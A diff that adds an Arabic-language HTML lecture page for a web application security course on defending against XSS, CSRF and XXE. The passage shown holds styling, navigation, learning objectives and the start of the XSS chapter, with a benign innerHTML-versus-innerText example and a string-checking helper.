@@ -1,0 +1,1570 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مذكرة الدروس — الفصول 22–24 | CYB 236</title>
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&family=Noto+Sans+Arabic:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-50: #eef2ff;
+            --primary-600: #4f46e5;
+            --primary-700: #4338ca;
+
+            --neutral-50: #fafafa;
+            --neutral-100: #f5f5f5;
+            --neutral-200: #e5e5e5;
+            --neutral-300: #d4d4d4;
+            --neutral-400: #a3a3a3;
+            --neutral-500: #737373;
+            --neutral-600: #525252;
+            --neutral-700: #404040;
+            --neutral-800: #262626;
+            --neutral-900: #171717;
+
+            --shadow-sm: 0 1px 2px 0 rgb(0 0 0 / 0.05);
+            --shadow-md: 0 4px 6px -1px rgb(0 0 0 / 0.1), 0 2px 4px -2px rgb(0 0 0 / 0.1);
+
+            /* ── ألوان الفصول 22-24 ── */
+            --ch: #4f46e5;
+            --ch-light: #eef2ff;
+            --ch-mid: #a5b4fc;
+            --ch-dark: #312e81;
+
+            --dark: var(--neutral-900);
+            --dark2: var(--neutral-800);
+            --gray: var(--neutral-500);
+            --text: var(--neutral-700);
+            --light: var(--neutral-50);
+            --border: var(--neutral-200);
+            --green: #16a34a;
+            --green-light: #f0fdf4;
+            --red: #dc2626;
+            --red-light: #fef2f2;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Noto Sans Arabic', 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, sans-serif;
+            line-height: 1.9;
+            color: var(--text);
+            background: var(--light);
+            font-size: 16px;
+            direction: rtl;
+        }
+
+        /* المصطلحات التقنية الإنجليزية */
+        .term {
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            direction: ltr;
+            display: inline-block;
+            background: var(--primary-50);
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-weight: 600;
+            color: var(--primary-700);
+        }
+
+        /* ───── شريط التنقل ───── */
+        .top-nav {
+            background: white;
+            border-bottom: 1px solid var(--neutral-200);
+            padding: 12px 0;
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+
+        .top-nav-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            padding: 0 40px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .nav-brand {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            text-decoration: none;
+            color: var(--neutral-800);
+        }
+
+        .nav-brand-icon {
+            width: 36px;
+            height: 36px;
+            background: linear-gradient(135deg, #4f46e5, #4338ca);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-weight: 700;
+            font-size: 14px;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            direction: ltr;
+        }
+
+        .nav-brand-text { font-weight: 600; font-size: 15px; }
+        .nav-links { display: flex; gap: 8px; }
+
+        .nav-link {
+            padding: 8px 16px;
+            border-radius: 8px;
+            text-decoration: none;
+            color: var(--neutral-600);
+            font-weight: 500;
+            font-size: 14px;
+            transition: all 0.2s;
+        }
+
+        .nav-link:hover { background: var(--neutral-100); color: var(--neutral-800); }
+        .nav-link.active { background: var(--primary-50); color: var(--primary-700); }
+
+        .lang-switch {
+            padding: 8px 16px;
+            border-radius: 8px;
+            text-decoration: none;
+            color: var(--neutral-600);
+            font-weight: 500;
+            font-size: 14px;
+            transition: all 0.2s;
+            border: 1px solid var(--neutral-300);
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+        .lang-switch:hover { background: var(--neutral-200); }
+
+        /* ───── الغلاف ───── */
+        .cover {
+            background: linear-gradient(135deg, #0f0a2e 0%, #1e1b4b 50%, #312e81 100%);
+            color: white;
+            padding: 80px 40px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cover::before {
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ffffff' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");
+        }
+
+        .cover-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            position: relative;
+            z-index: 1;
+            text-align: center;
+        }
+
+        .cover-breadcrumb {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+
+        .cover-breadcrumb a { color: #d4d4d4; text-decoration: none; }
+        .cover-breadcrumb span { color: #a3a3a3; }
+
+        .cover-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255,255,255,0.12);
+            backdrop-filter: blur(10px);
+            padding: 8px 16px;
+            border-radius: 100px;
+            font-size: 13px;
+            font-weight: 600;
+            color: var(--ch-mid);
+            margin-bottom: 20px;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+
+        .cover-badge-dot { width: 8px; height: 8px; background: var(--ch); border-radius: 50%; }
+
+        .cover h1 {
+            font-size: 48px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            letter-spacing: -0.01em;
+            line-height: 1.2;
+        }
+
+        .cover .sub { font-size: 20px; color: #d4d4d4; margin-bottom: 30px; }
+
+        .cover-chips { display: flex; gap: 12px; justify-content: center; flex-wrap: wrap; }
+
+        .cover-chip {
+            padding: 10px 22px;
+            border-radius: 14px;
+            font-weight: 700;
+            font-size: 0.9em;
+            border: 1px solid rgba(255,255,255,0.2);
+            backdrop-filter: blur(4px);
+            background: rgba(79,70,229,0.4);
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            direction: ltr;
+        }
+
+        /* ───── الحاوية ───── */
+        .container { max-width: 1400px; margin: 0 auto; padding: 40px; }
+
+        .main-layout {
+            display: grid;
+            grid-template-columns: 280px 1fr;
+            gap: 32px;
+            align-items: start;
+        }
+
+        /* ───── الشريط الجانبي ───── */
+        .sidebar { position: sticky; top: 86px; height: fit-content; }
+
+        .sidebar-card {
+            background: white;
+            border-radius: 16px;
+            border: 1px solid var(--neutral-200);
+            overflow: hidden;
+        }
+
+        .sidebar-header {
+            padding: 20px;
+            border-bottom: 1px solid var(--neutral-200);
+            background: var(--ch-light);
+        }
+
+        .sidebar-title {
+            font-size: 14px;
+            font-weight: 700;
+            color: var(--ch);
+            text-transform: uppercase;
+            letter-spacing: 0.05em;
+        }
+
+        .sidebar-nav {
+            padding: 12px;
+            max-height: calc(100vh - 160px);
+            overflow: auto;
+        }
+
+        .sidebar-link {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 9px 12px;
+            border-radius: 10px;
+            text-decoration: none;
+            color: var(--neutral-600);
+            font-weight: 500;
+            font-size: 13px;
+            transition: all 0.2s;
+            margin-bottom: 3px;
+            line-height: 1.35;
+        }
+
+        .sidebar-link:hover { background: var(--ch-light); color: var(--ch-dark); }
+        .sidebar-link.active { background: var(--ch-light); color: var(--ch); }
+
+        .sidebar-link-number {
+            width: 26px; height: 26px;
+            background: var(--neutral-100);
+            border-radius: 7px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 11px;
+            font-weight: 700;
+            color: var(--neutral-500);
+            flex-shrink: 0;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            direction: ltr;
+        }
+
+        .sidebar-link.active .sidebar-link-number { background: var(--ch); color: white; }
+
+        .sidebar-sep {
+            font-size: 11px;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--neutral-400);
+            padding: 12px 12px 6px;
+        }
+
+        /* ───── المحتوى ───── */
+        .content { min-width: 0; }
+
+        /* ───── رأس الفصل ───── */
+        .chapter-header { padding: 8px 0 30px; text-align: center; }
+
+        .chapter-num {
+            display: inline-block;
+            font-size: 0.85em;
+            font-weight: 700;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            padding: 6px 20px;
+            border-radius: 999px;
+            margin-bottom: 14px;
+            background: var(--ch-light);
+            color: var(--ch);
+            font-family: 'Plus Jakarta Sans', sans-serif;
+            direction: ltr;
+        }
+
+        .chapter-title { font-size: 2.2em; font-weight: 800; color: var(--dark); letter-spacing: -0.01em; }
+
+        .chapter-divider {
+            height: 4px;
+            border-radius: 2px;
+            margin: 10px auto 0;
+            width: 80px;
+            background: var(--ch);
+        }
+
+        /* ───── قسم الموضوع ───── */
+        .topic {
+            margin-bottom: 32px;
+            background: white;
+            border-radius: 20px;
+            border: 1px solid var(--neutral-200);
+            padding: 34px;
+        }
+
+        .topic-header {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 24px;
+            padding-bottom: 18px;
+            border-bottom: 2px solid var(--neutral-100);
+        }
+
+        .topic-icon {
+            width: 48px; height: 48px;
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5em;
+            flex-shrink: 0;
+            background: var(--ch-light);
+        }
+
+        h2 { font-size: 1.55em; font-weight: 700; color: var(--dark); }
+        h3 { font-size: 1.2em; color: var(--dark2); margin: 24px 0 10px; }
+        p { margin-bottom: 14px; font-size: 1.02em; }
+        strong { color: var(--dark); }
+
+        /* ───── بطاقات الأهداف ───── */
+        .objectives-grid { display: grid; gap: 16px; }
+
+        .objective-card {
+            display: flex;
+            gap: 16px;
+            padding: 20px;
+            background: var(--neutral-50);
+            border-radius: 12px;
+            border: 1px solid var(--neutral-200);
+        }
+
+        .objective-number {
+            width: 40px; height: 40px;
+            background: var(--ch);
+            color: white;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 700;
+            font-size: 16px;
+            flex-shrink: 0;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+
+        .objective-text { color: var(--neutral-700); font-size: 15px; line-height: 1.7; }
+
+        /* ───── صندوق القصة ───── */
+        .story {
+            background: var(--ch-light);
+            border-radius: 18px;
+            padding: 28px 30px;
+            margin: 24px 0;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid #c7d2fe;
+            border-right: 5px solid var(--ch);
+        }
+
+        .story-label {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 700;
+            font-size: 0.85em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            margin-bottom: 12px;
+            padding: 4px 14px;
+            border-radius: 8px;
+            background: #e0e7ff;
+            color: var(--ch);
+        }
+
+        .story p { margin-bottom: 10px; }
+        .story p:last-child { margin-bottom: 0; }
+
+        /* ───── نقطة رئيسية ───── */
+        .key-point {
+            background: linear-gradient(135deg, #f0fdf4, #dcfce7);
+            border-right: 5px solid var(--green);
+            border-radius: 14px 0 0 14px;
+            padding: 20px 24px;
+            margin: 20px 0;
+        }
+
+        .key-point h4 { color: var(--green); margin-bottom: 6px; font-size: 1em; }
+        .key-point p { margin-bottom: 0; font-size: 1em; }
+
+        /* ───── تحذير ───── */
+        .warning {
+            background: linear-gradient(135deg, var(--red-light), #fecaca);
+            border-right: 5px solid var(--red);
+            border-radius: 14px 0 0 14px;
+            padding: 20px 24px;
+            margin: 20px 0;
+        }
+
+        .warning h4 { color: var(--red); margin-bottom: 6px; font-size: 1em; }
+        .warning p { margin-bottom: 0; font-size: 1em; }
+
+        /* ───── صندوق معلومات ───── */
+        .info-box {
+            background: linear-gradient(135deg, #eff6ff, #dbeafe);
+            border-right: 5px solid #3b82f6;
+            border-radius: 14px 0 0 14px;
+            padding: 20px 24px;
+            margin: 20px 0;
+        }
+
+        .info-box h4 { color: #1d4ed8; margin-bottom: 6px; font-size: 1em; }
+        .info-box p { margin-bottom: 0; font-size: 1em; }
+
+        /* ───── صندوق نيلي ───── */
+        .indigo-box {
+            background: linear-gradient(135deg, #eef2ff, #e0e7ff);
+            border-right: 5px solid var(--ch);
+            border-radius: 14px 0 0 14px;
+            padding: 20px 24px;
+            margin: 20px 0;
+        }
+
+        .indigo-box h4 { color: var(--ch); margin-bottom: 6px; font-size: 1em; }
+        .indigo-box p { margin-bottom: 0; font-size: 1em; }
+
+        /* ───── قائمة نظيفة ───── */
+        .clean-list { list-style: none; padding: 0; margin: 16px 0; }
+
+        .clean-list li {
+            padding: 10px 36px 10px 0;
+            position: relative;
+            border-bottom: 1px solid var(--border);
+            font-size: 1.02em;
+        }
+
+        .clean-list li:last-child { border-bottom: none; }
+
+        .clean-list li::before {
+            content: '';
+            position: absolute;
+            right: 0; top: 14px;
+            width: 20px; height: 20px;
+            border-radius: 6px;
+            background: var(--ch-light);
+            border: 1px solid #c7d2fe;
+        }
+
+        /* ───── شبكة مقارنة ───── */
+        .compare-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 16px;
+            margin: 24px 0;
+        }
+
+        .compare-card {
+            background: var(--neutral-50);
+            border-radius: 16px;
+            padding: 24px;
+            box-shadow: var(--shadow-sm);
+            border-top: 4px solid;
+        }
+
+        .compare-card h4 { margin-bottom: 8px; font-size: 1.1em; }
+        .compare-card p { font-size: 0.95em; margin-bottom: 0; }
+
+        /* ───── شبكة بطاقات ───── */
+        .map-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+            gap: 14px;
+            margin: 20px 0;
+        }
+
+        .map-card {
+            background: white;
+            border-radius: 14px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: var(--shadow-sm);
+            border: 1px solid var(--border);
+            border-top: 3px solid var(--ch);
+            transition: transform 0.2s;
+        }
+
+        .map-card:hover { transform: translateY(-3px); }
+        .map-card .mc-icon { font-size: 2em; margin-bottom: 8px; }
+        .map-card .mc-title { font-weight: 700; color: var(--dark); font-size: 0.95em; margin-bottom: 4px; }
+        .map-card .mc-desc { color: var(--gray); font-size: 0.85em; }
+
+        /* ───── قائمة خطوات ───── */
+        .step-list { list-style: none; padding: 0; margin: 20px 0; }
+
+        .step-list li {
+            display: flex;
+            gap: 16px;
+            padding: 14px 0;
+            border-bottom: 1px solid var(--border);
+            align-items: flex-start;
+        }
+
+        .step-list li:last-child { border-bottom: none; }
+
+        .step-num {
+            width: 32px; height: 32px;
+            background: var(--ch);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: 800;
+            font-size: 0.95em;
+            color: white;
+            flex-shrink: 0;
+            margin-top: 2px;
+            font-family: 'Plus Jakarta Sans', sans-serif;
+        }
+
+        /* ───── صندوق الكود ───── */
+        .code-box {
+            background: #0f172a;
+            border-radius: 14px;
+            padding: 22px 24px;
+            margin: 20px 0;
+            font-family: 'JetBrains Mono', 'Consolas', monospace;
+            font-size: 0.88em;
+            line-height: 1.9;
+            color: #e2e8f0;
+            overflow-x: auto;
+            white-space: pre;
+            direction: ltr;
+            text-align: left;
+        }
+
+        .code-box .k { color: #93c5fd; }
+        .code-box .s { color: #86efac; }
+        .code-box .n { color: #fbbf24; }
+        .code-box .c { color: #64748b; font-style: italic; }
+        .code-box .tag { color: #f472b6; }
+        .code-box .attr { color: #a5b4fc; }
+
+        /* ───── جدول البيانات ───── */
+        .data-table { width: 100%; border-collapse: separate; border-spacing: 0 6px; margin: 20px 0; }
+
+        .data-table th {
+            text-align: right;
+            padding: 10px 16px;
+            font-size: 0.8em;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            color: var(--gray);
+        }
+
+        .data-table td { padding: 14px 16px; background: white; font-size: 0.98em; }
+        .data-table tr td:last-child  { border-radius: 10px 0 0 10px; }
+        .data-table tr td:first-child { border-radius: 0 10px 10px 0; }
+        .data-table tbody tr { box-shadow: 0 1px 4px rgba(0,0,0,0.05); }
+
+        /* ───── فاصل الأقسام ───── */
+        .section-divider {
+            height: 4px;
+            background: linear-gradient(90deg, var(--ch-light), var(--ch), var(--ch-light));
+            margin: 48px 0;
+            border-radius: 3px;
+        }
+
+        /* ───── بانر الملخص ───── */
+        .summary-banner {
+            background: linear-gradient(135deg, var(--ch-dark), var(--ch));
+            border-radius: 18px;
+            padding: 30px;
+            margin: 30px 0;
+            color: white;
+        }
+
+        .summary-banner h3 { color: white; font-size: 1.3em; margin-bottom: 14px; }
+        .summary-banner ul { list-style: none; padding: 0; }
+
+        .summary-banner li {
+            padding: 8px 28px 8px 0;
+            position: relative;
+            opacity: 0.95;
+            font-size: 1.02em;
+        }
+
+        .summary-banner li::before { content: '\2713'; position: absolute; right: 0; font-weight: 700; }
+
+        /* ───── التذييل ───── */
+        .footer { background: var(--neutral-900); color: white; padding: 48px 40px; margin-top: 20px; }
+
+        .footer-inner {
+            max-width: 1400px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            gap: 20px;
+            flex-wrap: wrap;
+        }
+
+        .footer-brand { font-weight: 700; font-size: 18px; }
+        .footer-links { display: flex; gap: 24px; }
+        .footer-links a { color: var(--neutral-400); text-decoration: none; font-size: 14px; }
+        .footer-links a:hover { color: white; }
+
+        @media (max-width: 900px) {
+            .main-layout { grid-template-columns: 1fr; }
+            .sidebar { position: static; }
+            .compare-grid { grid-template-columns: 1fr; }
+            .cover h1 { font-size: 32px; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- شريط التنقل -->
+<nav class="top-nav">
+    <div class="top-nav-inner">
+        <a href="../index.html" class="nav-brand">
+            <div class="nav-brand-icon">CYB</div>
+            <span class="nav-brand-text">CYB 236: أمن تطبيقات الويب</span>
+        </a>
+        <div class="nav-links">
+            <a href="index.html" class="lang-switch">English</a>
+            <a href="../index.html" class="nav-link">الصفحة الرئيسية</a>
+            <a href="../week8/index-ar.html" class="nav-link">الأسبوع 8</a>
+            <a href="index-ar.html" class="nav-link active">الأسبوع 9</a>
+        </div>
+    </div>
+</nav>
+
+<!-- ══════════════════════ الغلاف ══════════════════════ -->
+<header class="cover">
+    <div class="cover-inner">
+        <div class="cover-breadcrumb">
+            <a href="../index.html">CYB 236</a>
+            <span>›</span>
+            <span>الأسبوع 9</span>
+            <span>›</span>
+            <span>الجزء الثالث — التطوير الآمن III</span>
+        </div>
+        <div class="cover-badge">
+            <div class="cover-badge-dot"></div>
+            الأسبوع 9 &nbsp;·&nbsp; التطوير الآمن III
+        </div>
+        <h1>الدفاع ضد هجمات <span class="term">XSS</span> و<span class="term">CSRF</span> و<span class="term">XXE</span></h1>
+        <p class="sub">تنقية · ترميز · ضبط · إزالة أسطح الهجوم</p>
+        <div class="cover-chips">
+            <div class="cover-chip">ف.22 الدفاع ضد XSS</div>
+            <div class="cover-chip">ف.23 الدفاع ضد CSRF</div>
+            <div class="cover-chip">ف.24 الدفاع ضد XXE</div>
+        </div>
+    </div>
+</header>
+
+<!-- ══════════════════════ المحتوى ══════════════════════ -->
+<div class="container">
+<div class="main-layout">
+
+<!-- ═══════════ الشريط الجانبي ═══════════ -->
+<aside class="sidebar">
+    <div class="sidebar-card">
+        <div class="sidebar-header">
+            <div class="sidebar-title">الفصول 22–24 — المحتويات</div>
+        </div>
+        <nav class="sidebar-nav">
+            <a href="#overview"        class="sidebar-link active"><span class="sidebar-link-number">1</span>نظرة عامة</a>
+            <a href="#objectives"      class="sidebar-link"><span class="sidebar-link-number">2</span>أهداف التعلم</a>
+            <div class="sidebar-sep">ف.22 — الدفاع ضد XSS</div>
+            <a href="#xss-best"        class="sidebar-link"><span class="sidebar-link-number">3</span>أفضل ممارسات مكافحة XSS</a>
+            <a href="#xss-sanitize"    class="sidebar-link"><span class="sidebar-link-number">4</span>تنقية مدخلات المستخدم</a>
+            <a href="#xss-sinks"       class="sidebar-link"><span class="sidebar-link-number">5</span>واجهات DOM الخطيرة</a>
+            <a href="#xss-entity"      class="sidebar-link"><span class="sidebar-link-number">6</span>ترميز كيانات HTML</a>
+            <a href="#xss-css"         class="sidebar-link"><span class="sidebar-link-number">7</span>CSS كناقل هجوم</a>
+            <a href="#xss-csp"         class="sidebar-link"><span class="sidebar-link-number">8</span>سياسة أمان المحتوى</a>
+            <div class="sidebar-sep">ف.23 — الدفاع ضد CSRF</div>
+            <a href="#csrf-headers"    class="sidebar-link"><span class="sidebar-link-number">9</span>التحقق من الترويسات</a>
+            <a href="#csrf-tokens"     class="sidebar-link"><span class="sidebar-link-number">10</span>رموز CSRF</a>
+            <a href="#csrf-get"        class="sidebar-link"><span class="sidebar-link-number">11</span>طلبات GET عديمة الحالة</a>
+            <a href="#csrf-middleware" class="sidebar-link"><span class="sidebar-link-number">12</span>برمجيات CSRF الوسيطة</a>
+            <div class="sidebar-sep">ف.24 — الدفاع ضد XXE</div>
+            <a href="#xxe-disable"     class="sidebar-link"><span class="sidebar-link-number">13</span>تعطيل الكيانات الخارجية</a>
+            <a href="#xxe-json"        class="sidebar-link"><span class="sidebar-link-number">14</span>XML مقابل JSON</a>
+            <a href="#xxe-advanced"    class="sidebar-link"><span class="sidebar-link-number">15</span>مخاطر XXE المتقدمة</a>
+            <div class="sidebar-sep">الخلاصة</div>
+            <a href="#summary"         class="sidebar-link"><span class="sidebar-link-number">16</span>الملخص الشامل</a>
+        </nav>
+    </div>
+</aside>
+
+<!-- ═══════════ المحتوى الرئيسي ═══════════ -->
+<main class="content">
+
+<!-- ════════ رأس الفصل ════════ -->
+<div class="chapter-header">
+    <div class="chapter-num">الفصول 22 – 24</div>
+    <div class="chapter-title">الدفاع ضد هجمات <span class="term">XSS</span> و<span class="term">CSRF</span> و<span class="term">XXE</span></div>
+    <div class="chapter-divider"></div>
+</div>
+
+<!-- ════════ نظرة عامة ════════ -->
+<div id="overview" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128737;</div>
+        <h2>نظرة عامة — من الهجوم إلى الدفاع</h2>
+    </div>
+
+    <p>في الجزء الثاني من الكتاب، تعلمنا كيفية استغلال تطبيقات الويب باستخدام هجمات <span class="term">XSS</span> و<span class="term">CSRF</span> و<span class="term">XXE</span>. أما الآن في الجزء الثالث، فنحول المنظور: الهدف هو الدفاع عن قاعدة الكود الخاصة بنا ضد هذه الفئات من الهجمات. يقدم كل فصل تقنيات برمجية محددة وتغييرات في الإعداد وقرارات معمارية تُزيل سطح الهجوم أو تُقلصه بشكل كبير.</p>
+
+    <div class="map-grid">
+        <div class="map-card">
+            <div class="mc-icon">&#128187;</div>
+            <div class="mc-title">ف.22 — الدفاع ضد XSS</div>
+            <div class="mc-desc">تنقية <span class="term">DOM</span>، تجنب الواجهات الخطيرة، ترميز الكيانات، ونشر سياسة أمان المحتوى (<span class="term">CSP</span>).</div>
+        </div>
+        <div class="map-card">
+            <div class="mc-icon">&#128274;</div>
+            <div class="mc-title">ف.23 — الدفاع ضد CSRF</div>
+            <div class="mc-desc">التحقق من الترويسات، تنفيذ رموز <span class="term">CSRF</span>، فرض طلبات <span class="term">GET</span> عديمة الحالة، وبناء برمجيات <span class="term">CSRF</span> الوسيطة.</div>
+        </div>
+        <div class="map-card">
+            <div class="mc-icon">&#128196;</div>
+            <div class="mc-title">ف.24 — الدفاع ضد XXE</div>
+            <div class="mc-desc">تعطيل الكيانات الخارجية، تقييم صيغ البيانات البديلة (<span class="term">JSON</span>)، وفهم مخاطر تصاعد <span class="term">XXE</span> المتقدمة.</div>
+        </div>
+    </div>
+
+    <div class="indigo-box">
+        <h4>&#128203; الدفاع دائمًا متعدد الطبقات</h4>
+        <p>لا تحمي تقنية واحدة بالكامل من أيٍّ من هذه الفئات من الهجمات. يجمع الدفاع الفعّال بين استراتيجيات متعددة — أفضل ممارسات البرمجة، وتنقية المدخلات، والتحقق القائم على الرموز، وسياسات مستوى المتصفح — بحيث إذا تجاوز أحد الطبقات، تبقى الطبقات الأخرى في مكانها.</p>
+    </div>
+</div>
+
+<!-- ════════ أهداف التعلم ════════ -->
+<div id="objectives" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#127919;</div>
+        <h2>أهداف التعلم</h2>
+    </div>
+    <div class="objectives-grid">
+        <div class="objective-card">
+            <div class="objective-number">1</div>
+            <div class="objective-text"><strong>تطبيق</strong> أفضل ممارسات البرمجة لمكافحة <span class="term">XSS</span> — بما في ذلك الفرق بين <span class="term">innerText</span> و<span class="term">innerHTML</span>، والتحقق من القيم الشبيهة بالنصوص، وتحديد المصارف الخطيرة في <span class="term">DOM API</span> (<span class="term">DOMParser</span> و<span class="term">SVG</span> و<span class="term">Blob</span>).</div>
+        </div>
+        <div class="objective-card">
+            <div class="objective-number">2</div>
+            <div class="objective-text"><strong>ضبط</strong> سياسة أمان المحتوى (<span class="term">CSP</span>) لتقييد مصادر النصوص البرمجية وتعطيل <span class="term">unsafe-eval</span> و<span class="term">unsafe-inline</span>، مع شرح كيفية تخفيف <span class="term">CSP</span> لـ <span class="term">XSS</span> على مستوى المتصفح.</div>
+        </div>
+        <div class="objective-card">
+            <div class="objective-number">3</div>
+            <div class="objective-text"><strong>تنفيذ</strong> دفاعات <span class="term">CSRF</span> — بما في ذلك التحقق من ترويسات <span class="term">Origin</span>/<span class="term">Referer</span>، ورموز <span class="term">CSRF</span> ذات الحالة وعديمتها، وبرمجيات مكافحة <span class="term">CSRF</span> الوسيطة على مستوى التطبيق.</div>
+        </div>
+        <div class="objective-card">
+            <div class="objective-number">4</div>
+            <div class="objective-text"><strong>شرح</strong> سبب عدم قيام طلبات <span class="term">HTTP GET</span> بتعديل حالة الخادم أبدًا، وكيف تُزيل هذه القاعدة التصميمية الواحدة أكثر فئات هجمات <span class="term">CSRF</span> شيوعًا.</div>
+        </div>
+        <div class="objective-card">
+            <div class="objective-number">5</div>
+            <div class="objective-text"><strong>الدفاع</strong> ضد <span class="term">XXE</span> عن طريق تعطيل الكيانات الخارجية في محللات <span class="term">XML</span>، وتقييم <span class="term">JSON</span> كبديل أكثر أمانًا، والتعرف على كيفية تصاعد <span class="term">XXE</span> من وصول للقراءة فحسب إلى تنفيذ تعليمات برمجية عن بُعد.</div>
+        </div>
+    </div>
+</div>
+
+<div class="section-divider"></div>
+
+<!-- ══════════════════════════════════════════════════════════ -->
+<!--               الفصل 22 — الدفاع ضد XSS                   -->
+<!-- ══════════════════════════════════════════════════════════ -->
+
+<!-- ════════ أفضل ممارسات مكافحة XSS ════════ -->
+<div id="xss-best" class="topic">
+    <div class="topic-header">
+        <div class="topic-icon">&#128187;</div>
+        <h2>ف.22 — أفضل ممارسات البرمجة لمكافحة <span class="term">XSS</span></h2>
+    </div>
+
+    <p>القاعدة الأهم لمنع <span class="term">XSS</span>: <strong>«لا تسمح أبدًا لأي بيانات غير منقّاة مقدَّمة من المستخدم بأن تُمرَّر إلى <span class="term">DOM</span>.»</strong> من الناحية المثالية، يجب أن تدخل بيانات المستخدم إلى <span class="term">DOM</span> كنصوص عادية فحسب — وليس كـ <span class="term">HTML</span> يُفسّره المتصفح على أنه علامات قابلة للتنفيذ.</p>
+
+    <h3>القاعدة الأساسية</h3>
+
+    <div class="compare-grid">
+        <div class="compare-card" style="border-top-color: var(--red);">
+            <h4>&#10060; تجنب: <span class="term">innerHTML</span></h4>
+            <p>يُفسّر <span class="term">innerHTML</span> وسوم <span class="term">HTML</span> كعناصر <span class="term">DOM</span> فعلية. إذا كانت مدخلات المستخدم تحتوي على وسوم <code>&lt;script&gt;</code> أو سمات معالج الأحداث، فإنها تُنفَّذ كرمز برمجي.</p>
+        </div>
+        <div class="compare-card" style="border-top-color: var(--green);">
+            <h4>&#9989; أفضل: <span class="term">innerText</span></h4>
+            <p>يُعامل <span class="term">innerText</span> كل شيء كنص عادي. تُعرض وسوم <span class="term">HTML</span> كنص حرفي، وليس كـ <span class="term">DOM</span>. هذا أكثر أمانًا بشكل ملحوظ.</p>
+        </div>
+    </div>
+
+    <div class="code-box">
+<span class="c">// ✗ UNSAFE — tags are interpreted as DOM</span>
+<span class="k">const</span> userString = <span class="s">'&lt;strong&gt;hello, world!&lt;/strong&gt;'</span>;
+<span class="k">const</span> div = document.querySelector(<span class="s">'#userComment'</span>);
+div.<span class="n">innerHTML</span> = userString;  <span class="c">// &lt;strong&gt; renders as bold text</span>
+
+<span class="c">// ✓ SAFE — tags are displayed as literal text</span>
+div.<span class="n">innerText</span> = userString;  <span class="c">// shows "&lt;strong&gt;hello, world!&lt;/strong&gt;" as text</span>
+    </div>
+
+    <h3>التحقق من الكائنات الشبيهة بالنصوص</h3>
+    <p>قبل إدراج أي بيانات مستخدم في <span class="term">DOM</span>، تحقق من أنها سلسلة أو رقم أولي (قيمة «شبيهة بالنص»). يجب رفض الكائنات المعقدة مثل الدوال.</p>
+
+    <div class="code-box">
+<span class="c">// Check if a value is a simple string</span>
+<span class="k">const</span> <span class="n">isString</span> = <span class="k">function</span>(x) {
+    <span class="k">if</span> (<span class="k">typeof</span> x === <span class="s">'string'</span> || x <span class="k">instanceof</span> String) {
+        <span class="k">return</span> <span class="n">true</span>;
+    }
+    <span class="k">return</span> <span class="n">false</span>;
+};
+
+<span class="c">// Check if a value is "string-like" (string or number — safe for DOM)</span>
+<span class="k">const</span> <span class="n">isStringLike</span> = <span class="k">function</span>(x) {
+    <span class="k">try</span> {
+        <span class="k">return</span> JSON.stringify(JSON.parse(x)) === x;
+    } <span class="k">catch</span> (e) {
+        console.log(<span class="s">'not string-like'</span>);
+    }
+};
+    </div>
+
+    <div class="key-point">
+        <h4>&#128273; الرفض كخيار افتراضي</h4>
